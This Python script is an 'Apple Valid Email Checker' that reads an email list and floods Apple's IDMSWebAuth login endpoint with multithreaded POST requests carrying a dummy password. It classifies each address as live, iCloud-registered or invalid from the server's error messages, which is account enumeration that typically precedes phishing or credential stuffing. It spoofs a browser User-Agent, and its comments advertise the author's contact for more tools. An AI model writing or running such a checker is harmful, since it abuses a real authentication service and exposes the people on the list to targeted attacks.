#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import re
import time
import threading
import sys
import queue
import sys
import datetime
import os 
os.system ("cls")

class Apple():

	ua 			= 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
	live 		= 'Access denied. Your account does not have permission to access this application.'.encode()
	die 		= 'Your Apple ID or password was entered incorrectly.'.encode()
	version 	= 'Apple  V1'
	input_queue = queue.Queue()

 # I don t need your fucking email list to put my backdoor <3 #
	def __init__(self):

		print(r"""

 ___ __ __   ______        ______   ___   __        __   __   ________  ______    
 /__//_//_/\ /_____/\      /_____/\ /__/\ /__/\     /_/\ /_/\ /_______/\/_____/\   
 \::\| \| \ \\:::_ \ \     \::::_\/_\::\_\\  \ \    \:\ \\ \ \\__.::._\/\:::_ \ \  
  \:.      \ \\:(_) ) )_    \:\/___/\\:. `-\  \ \    \:\ \\ \ \  \::\ \  \:(_) \ \ 
   \:.\-/\  \ \\: __ `\ \    \_::._\:\\:. _    \ \    \:\_/.:\ \ _\::\ \__\: ___\/
    \. \  \  \ \\ \ `\ \ \     /____\:\\. \`-\  \ \    \ ..::/ //__\::\__/\\ \ \   
     \__\/ \__\/ \_\/ \_\/     \_____\/ \__\/ \__\/     \___/_( \________\/ \_\/   
                           ' APPLE VALID EMAIL CHECKER '                                               
		""")
		self.thread = input(" -> Thread ' don t put over 30 ' : ")
		self.mailist = input(" -> Give me your mailist  : ")
		self.count_list = len(list(open(self.mailist)))
		self.clean = input(" -> Clean old result folder ? (yes/no) ")
		if self.clean == 'yes' : self.clean_result()
		print('Starting ... please wait')


	def save_to_file(self,nameFile,x):
		kl = open(nameFile, 'a+')
		kl.write(x)
		kl.close()

	def clean_result(self):
		open('result/live.txt', 'w').close()
		open('result/bad.txt', 'w').close()
		open('result/icloud.txt', 'w').close()

	def post_email(self,eml):

		r = requests.post('https://idmsac.apple.com/IDMSWebAuth/authenticate',
					data={
						'accountPassword':'xxxxxxx',
						'appleId':eml,
						'appIdKey':'f52543bf72b66552b41677a95aa808462c95ebaaaf19323ddb3be843e5100cb8'
						},
					headers={'User-Agent': self.ua}
				)
		if self.live in r.content: return 'live'
		elif self.die in r.content: return 'die'
		else : return 'bad'

	def chk(self):

		while 1:

			eml = self.input_queue.get()
			res = self.post_email(eml)

			if res == 'live':
				print(' \u001b[32m+\u001b[32m \u001b[32mLIVE\u001b[32m \u001b[32m+ '+eml)
				self.save_to_file('result/live.txt',eml+'\n')
			elif res == 'die':
				print(' \u001b[32m+\u001b[32m ICLOUD\u001b[32m \u001b[32m+ '+eml)
				self.save_to_file('result/icloud.txt',eml+'\n')
			elif res == 'bad':
				print(' \u001b[31m- \u001b[31mBAD\u001b[31m \u001b[31m-\u001b[31m '+eml)
				self.save_to_file('result/bad.txt',eml+'\n')

			self.input_queue.task_done()

	def run_thread(self):

		self.start_time = time.time()

		for x in range(int(self.thread)):
			t = threading.Thread(target=self.chk)
			t.setDaemon(True)
			t.start()

		for y in open(self.mailist, 'r').readlines():
			self.input_queue.put(y.strip())
		self.input_queue.join()

	def finish(self):
		print('')
		print('-------------------------------------------------')
		print('')
		print('Checking ',self.count_list,' completed ')
		print('Processing time : ',time.time() - self.start_time,'seconds')
		print('')
		print('Live : ',len(list(open('result/live.txt'))),'emails')
		print('die : ',len(list(open('result/icloud.txt'))),'emails')
		print('Unknown : ',len(list(open('result/bad.txt'))),'emails')
		print('')
		print('For mmore tools contact Mr~Sn_Vip :D')
		print('http://www.fb.com/Mr.SnVip1/')

heh = Apple()
heh.run_thread()
heh.finish()

#One day stoling codes has been wasted to get this checker {#enjoy] #
